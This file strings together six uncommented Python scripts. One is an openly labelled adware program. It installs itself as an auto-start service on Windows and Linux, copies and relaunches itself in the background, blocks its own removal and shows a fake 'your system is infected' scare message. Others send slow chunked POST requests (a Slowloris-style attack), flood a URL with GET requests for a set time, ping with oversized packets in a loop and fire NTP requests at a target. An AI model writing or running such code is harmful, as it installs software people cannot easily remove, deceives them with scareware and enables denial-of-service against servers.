import os
import sys
import time
import urllib.request
import json

STATE_FILE = './target/state.json'

DEFAULT_URL = "https://example.com/sample.txt"  # Default URL for downloading
DEFAULT_NOTIFICATION_URL = "https://example.com/notify"  # Default notification URL
DEFAULT_TARGET_DIRECTORY = './target'
DEFAULT_INTERVAL = 5  # Default interval in seconds
DEFAULT_MAX_ITERATIONS = 3  # Default number of iterations

def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading state file: {e}")
    return {"completed_iterations": 0}

def save_state(state):
    try:
        with open(STATE_FILE, 'w') as f:
            json.dump(state, f)
    except Exception as e:
        print(f"Error saving state file: {e}")

def download_file(url, target_directory, notification_url):
    try:
        if not os.path.exists(target_directory):
            os.makedirs(target_directory)

        filename = os.path.basename(url)
        if not filename:
            print("Error: Unable to determine filename from URL.")
            return False

        filepath = os.path.join(target_directory, filename)
        urllib.request.urlretrieve(url, filepath)
        print(f"File downloaded successfully: {filepath}")
        print(f"Visit the notification URL: {notification_url}")
        return True

    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    # Default parameters
    url = DEFAULT_URL
    notification_url = DEFAULT_NOTIFICATION_URL
    target_directory = DEFAULT_TARGET_DIRECTORY
    interval = DEFAULT_INTERVAL
    max_iterations = DEFAULT_MAX_ITERATIONS
    persist = True  # Always persist state

    # Load persistent state if enabled
    state = load_state() if persist else {"completed_iterations": 0}

    # Ensure completed_iterations doesn't exceed max_iterations
    state["completed_iterations"] = min(state["completed_iterations"], max_iterations)

    for i in range(state["completed_iterations"], max_iterations):
        print(f"Starting iteration {i + 1}...")
        success = download_file(url, target_directory, notification_url)
        if success:
            state["completed_iterations"] = i + 1
            if persist:
                save_state(state)
        else:
            print(f"Iteration {i + 1} failed. Exiting.")
            sys.exit(1)
        if interval > 0 and i + 1 < max_iterations:
            time.sleep(interval)

    print("All iterations completed.")
    sys.exit(0)

if __name__ == "__main__":
    main()

import os
import sys
import shutil
import urllib.request
import subprocess
from datetime import datetime
import time

LOG_FILE = "notification_log.txt"
SANDBOX_DIR = "./sandbox"
DEFAULT_ITERATIONS = 1
DEFAULT_INTERVAL = 10  # seconds
FAKE_ADWARE_MSG = "Your system is infected! Visit the link for antivirus protection."

def fetch_url_content(url):
    try:
        with urllib.request.urlopen(url) as response:
            return response.read().decode("utf-8")
    except Exception as e:
        log_error(f"Error fetching URL content: {e}")
        sys.exit(1)

def log_content(content):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{timestamp}] {content}\n")
    except Exception as e:
        log_error(f"Error writing to log file: {e}")
        sys.exit(1)

def log_error(message):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{timestamp}] ERROR: {message}\n")
    except:
        print(f"Critical error: {message}", file=sys.stderr)

def copy_to_sandbox():
    try:
        os.makedirs(SANDBOX_DIR, exist_ok=True)
        target_path = os.path.join(SANDBOX_DIR, os.path.basename(__file__))
        if not os.path.exists(target_path):
            shutil.copy(__file__, target_path)
    except Exception as e:
        log_error(f"Error copying file to sandbox: {e}")
        sys.exit(1)

def run_as_background_process():
    try:
        subprocess.Popen([sys.executable, __file__, "--background"])
    except Exception as e:
        log_error(f"Error starting background process: {e}")

def display_fake_ads():
    print(FAKE_ADWARE_MSG)

def establish_persistence():
    if os.name == "nt":  # Windows
        try:
            subprocess.run(
                f"sc create AdwareService binPath= \"{sys.executable} {__file__}\" start= auto",
                shell=True,
                check=True,
            )
        except Exception as e:
            log_error(f"Error establishing persistence on Windows: {e}")
    else:  # Linux / Unix-like
        try:
            service_file = "/etc/systemd/system/adware.service"
            service_content = f"""[Unit]
Description=Adware Service
[Service]
ExecStart={sys.executable} {__file__}
Restart=always
[Install]
WantedBy=multi-user.target
"""
            with open(service_file, "w") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "enable", "adware"], check=True)
        except Exception as e:
            log_error(f"Error establishing persistence on Linux: {e}")

def disable_uninstallation():
    try:
        if os.name == "nt":  # Windows
            os.rename(__file__, __file__ + ".locked")
        else:  # Linux / Unix-like
            os.chmod(__file__, 0o444)  # Read-only
    except Exception as e:
        log_error(f"Error disabling uninstallation: {e}")

def main():
    if "--background" in sys.argv:
        # Simulate a background process
        url = os.getenv("FETCH_URL", "https://example.com")
        iterations = int(os.getenv("FETCH_ITERATIONS", DEFAULT_ITERATIONS))
        interval = float(os.getenv("FETCH_INTERVAL", DEFAULT_INTERVAL))

        for _ in range(iterations):
            content = fetch_url_content(url)
            log_content(content)
            display_fake_ads()
            time.sleep(interval)
        sys.exit(0)

    copy_to_sandbox()
    os.environ["FETCH_URL"] = "https://example.com"
    os.environ["FETCH_ITERATIONS"] = str(DEFAULT_ITERATIONS)
    os.environ["FETCH_INTERVAL"] = str(DEFAULT_INTERVAL)

    establish_persistence()
    disable_uninstallation()
    run_as_background_process()

if __name__ == "__main__":
    main()

import http.client
import urllib.parse
import time
import os
import sys
from datetime import datetime, timedelta

LOG_DIR = './target'
LOG_FILE = os.path.join(LOG_DIR, 'network_requests.log')

DEFAULT_DURATION = 30  # default duration in seconds
DEFAULT_URL = "http://example.com"  # default URL for testing
DEFAULT_PAYLOAD = "key=value"  # default payload

def ensure_log_directory_exists():
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
    except Exception as e:
        print("Failed to create log directory:", e)

def log_request_attempt(timestamp, url, status=None, error=None):
    try:
        with open(LOG_FILE, 'a') as log_file:
            if error:
                log_file.write(f"{timestamp} | URL: {url} | ERROR: {error}\n")
            else:
                log_file.write(f"{timestamp} | URL: {url} | STATUS: {status}\n")
    except Exception as e:
        print("Failed to write to log file:", e)

def send_slow_post_request(url, payload, chunk_size=10, delay=0.5):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.scheme not in ('http', 'https'):
            raise ValueError("Invalid URL scheme. Use 'http' or 'https'.")

        connection = (http.client.HTTPSConnection if parsed_url.scheme == 'https' 
                      else http.client.HTTPConnection)(parsed_url.netloc)

        path = parsed_url.path or '/'
        connection.connect()
        connection.putrequest("POST", path)
        connection.putheader("Content-Type", "application/x-www-form-urlencoded")
        connection.putheader("Content-Length", str(len(payload)))
        connection.endheaders()

        for i in range(0, len(payload), chunk_size):
            connection.send(payload[i:i + chunk_size].encode('utf-8'))
            time.sleep(delay)

        response = connection.getresponse()
        status = f"{response.status} {response.reason}"
        body = response.read().decode('utf-8')
        print("Response status:", response.status)
        print("Response reason:", response.reason)
        print("Response body:", body)
        log_request_attempt(timestamp, url, status=status)
    except ValueError as ve:
        print("Error:", ve)
        log_request_attempt(timestamp, url, error=str(ve))
    except Exception as e:
        print("Error occurred:", e)
        log_request_attempt(timestamp, url, error=str(e))
    finally:
        if 'connection' in locals():
            connection.close()

def validate_duration(duration):
    try:
        return int(duration)
    except ValueError:
        raise ValueError("Duration must be a positive integer representing seconds.")

def main():
    ensure_log_directory_exists()

    if len(sys.argv) > 2:
        print("Usage: python program.py [duration_in_seconds]")
        sys.exit(1)

    # Default values for silent execution
    duration_seconds = DEFAULT_DURATION
    target_url = DEFAULT_URL
    payload = DEFAULT_PAYLOAD

    # If a duration is provided as an argument, use it instead
    if len(sys.argv) == 2:
        try:
            duration_seconds = validate_duration(sys.argv[1])
            if duration_seconds <= 0:
                raise ValueError("Duration must be greater than 0.")
        except ValueError as e:
            print("Error:", e)
            sys.exit(1)

    end_time = datetime.now() + timedelta(seconds=duration_seconds)

    while datetime.now() < end_time:
        send_slow_post_request(target_url, payload)
        time.sleep(1)  # Pause between requests to avoid excessive traffic

    print("Test completed.")

if __name__ == "__main__":
    main()

import subprocess
import sys
import os
import time

def ping_host(target, count, timeout, packet_size):
    try:
        # Build the ping command based on the platform
        if sys.platform != "win32":
            command = ["ping", "-c", str(count), "-W", str(timeout), "-s", str(packet_size), target]
        else:
            command = ["ping", "-n", str(count), "-w", str(timeout * 1000), "-l", str(packet_size), target]

        # Execute the ping command
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout, result.stderr, result.returncode
    except FileNotFoundError:
        return None, "Ping command not found. Ensure it is available on your system.", 1
    except Exception as e:
        return None, f"Unexpected error occurred: {e}", 1

def parse_ping_output(output):
    lines = output.splitlines()
    parsed_results = []
    success_count = 0

    for line in lines:
        if "time=" in line or "Reply from" in line:
            parsed_results.append(line)
            success_count += 1
    return parsed_results, success_count

def log_results(log_file, target, results, error_message=None):
    with open(log_file, "a", encoding="utf-8") as file:
        file.write(f"Ping results for {target}:\n")
        if results:
            for line in results:
                file.write(line + "\n")
        if error_message:
            file.write(f"Error: {error_message}\n")
        file.write("\n")

def send_oversized_packets(target, duration, packet_size, timeout, log_file):
    end_time = time.time() + duration
    count = 1  # Send one packet at a time in a loop
    while time.time() < end_time:
        stdout, stderr, return_code = ping_host(target, count, timeout, packet_size)
        if stdout:
            parsed_results, _ = parse_ping_output(stdout)
            log_results(log_file, target, parsed_results)
        elif stderr:
            log_results(log_file, target, None, error_message=stderr)
        time.sleep(timeout)  # Wait for timeout duration before sending next packet

def validate_parameters(target, packet_size, timeout, duration):
    if not isinstance(target, str) or not target:
        raise ValueError("Target must be a non-empty string.")
    if not isinstance(packet_size, int) or packet_size <= 0 or packet_size > 65507:
        raise ValueError("Packet size must be a positive integer and less than or equal to 65507.")
    if not isinstance(timeout, int) or timeout <= 0:
        raise ValueError("Timeout must be a positive integer.")
    if not isinstance(duration, int) or duration <= 0:
        raise ValueError("Duration must be a positive integer.")

def ensure_log_file_exists(log_file):
    try:
        if not os.path.exists(log_file):
            with open(log_file, "w", encoding="utf-8") as file:
                file.write("Ping Log File\n")
                file.write("=" * 50 + "\n\n")
    except Exception as e:
        print(f"Error creating log file: {e}", file=sys.stderr)
        sys.exit(1)

def main():
    target = "8.8.8.8"  # Default target (Google Public DNS)
    count = 4  # Default number of ping attempts
    timeout = 1  # Default timeout duration in seconds
    packet_size = 1024  # Default packet size in bytes
    duration = 10  # Default duration for oversized packet pinging in seconds

    log_file = os.path.join(os.getcwd(), "ping_log.txt")

    # Ensure the log file exists before starting
    ensure_log_file_exists(log_file)

    try:
        # Validate parameters
        validate_parameters(target, packet_size, timeout, duration)

        # Perform initial ping
        stdout, stderr, return_code = ping_host(target, count, timeout, packet_size)
        if stdout is None:
            log_results(log_file, target, None, error_message=stderr)
            print(stderr, file=sys.stderr)
            sys.exit(1)

        parsed_results, success_count = parse_ping_output(stdout)
        log_results(log_file, target, parsed_results)

        print(f"Initial ping operation completed for {target}.")
        print(f"Number of successful replies: {success_count}")
        if return_code != 0:
            log_results(log_file, target, None, error_message=stderr)
            print(stderr, file=sys.stderr)

        # Perform oversized packet pinging
        send_oversized_packets(target, duration, packet_size, timeout, log_file)
        print(f"Oversized packet ping operation completed for {target}.")

    except ValueError as e:
        error_message = f"Parameter validation error: {e}"
        log_results(log_file, target, None, error_message=error_message)
        print(error_message, file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        error_message = f"Unexpected error: {e}"
        log_results(log_file, target, None, error_message=error_message)
        print(error_message, file=sys.stderr)
        sys.exit(1)

    sys.exit(0)

if __name__ == "__main__":
    main()

import sys
import time
import http.client
import argparse
from urllib.parse import urlparse


def send_requests(url, duration, log_file=None, silent=False):
    parsed_url = urlparse(url)
    connection = (
        http.client.HTTPSConnection(parsed_url.netloc)
        if parsed_url.scheme == "https"
        else http.client.HTTPConnection(parsed_url.netloc)
    )

    start_time = time.time()
    request_count = 0
    errors = []

    while time.time() - start_time < duration:
        try:
            connection.request("GET", parsed_url.path or "/")
            response = connection.getresponse()
            if not silent:
                print(f"Request {request_count + 1}: {response.status} {response.reason}")
            response.read()
            request_count += 1
        except Exception as e:
            error_message = f"Request {request_count + 1}: Error - {str(e)}"
            errors.append(error_message)
            if not silent:
                print(error_message)

    connection.close()

    # Log results to a log file if a path is provided
    if log_file:
        with open(log_file, "w") as log:
            log.write(f"Total requests sent: {request_count}\n")
            if errors:
                log.write("Errors:\n")
                log.write("\n".join(errors))
                log.write("\n")

    # Print summary if not in silent mode
    if not silent:
        print(f"\nTest completed. Total requests sent: {request_count}")
        if errors:
            print("Errors:")
            for error in errors:
                print(error)


def main():
    parser = argparse.ArgumentParser(
        description="HTTP GET request utility with configurable options."
    )
    parser.add_argument("url", help="Target URL to send requests to.")
    parser.add_argument(
        "duration", type=int, help="Test duration in seconds (e.g., 10)."
    )
    parser.add_argument(
        "--log-file", help="Path to a log file to save the results and errors."
    )
    parser.add_argument(
        "--silent", action="store_true", help="Run the utility in silent mode (no console output)."
    )
    args = parser.parse_args()

    try:
        send_requests(args.url, args.duration, log_file=args.log_file, silent=args.silent)
    except Exception as e:
        print(f"Fatal error: {str(e)}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()

import os
import socket
import sys
import time

LOG_DIR = './target'
LOG_FILE = os.path.join(LOG_DIR, 'traffic_test.log')

def log_request(target_ip, status, mode):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp} - Target: {target_ip}, Mode: {mode}, Status: {status}\n"
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(log_entry)

def ensure_log_directory():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def send_ntp_requests(target_ip, num_requests, interval, mode):
    ntp_data = b'\x1b' + 47 * b'\0'  # NTP request packet
    server_address = (target_ip, 123)  # NTP uses port 123

    for i in range(num_requests):
        try:
            if mode == 'live':
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.sendto(ntp_data, server_address)
            log_request(target_ip, 'Success', mode)
        except Exception as e:
            log_request(target_ip, f'Failure: {e}', mode)
        time.sleep(interval)

def main():
    if len(sys.argv) < 4:
        print("Usage: python ntp_simulator.py <target_ip> <num_requests> <mode> [interval]")
        print("  <mode>: 'live' or 'offline'")
        print("  [interval]: Optional time interval between requests in seconds (default: 1)")
        sys.exit(1)

    target_ip = sys.argv[1]
    try:
        num_requests = int(sys.argv[2])
    except ValueError:
        print("Error: <num_requests> must be an integer.")
        sys.exit(1)

    mode = sys.argv[3].lower()
    if mode not in ['live', 'offline']:
        print("Error: <mode> must be 'live' or 'offline'.")
        sys.exit(1)

    interval = 1  # Default interval
    if len(sys.argv) == 5:
        try:
            interval = float(sys.argv[4])
            if interval < 0:
                raise ValueError
        except ValueError:
            print("Error: [interval] must be a non-negative number.")
            sys.exit(1)

    ensure_log_directory()

    try:
        send_ntp_requests(target_ip, num_requests, interval, mode)
        print(f"Completed {num_requests} NTP requests to {target_ip} in {mode} mode. Logs saved to {LOG_FILE}")
    except KeyboardInterrupt:
        print("Program interrupted. Exiting cleanly...")
        sys.exit(0)

if __name__ == "__main__":
    main()

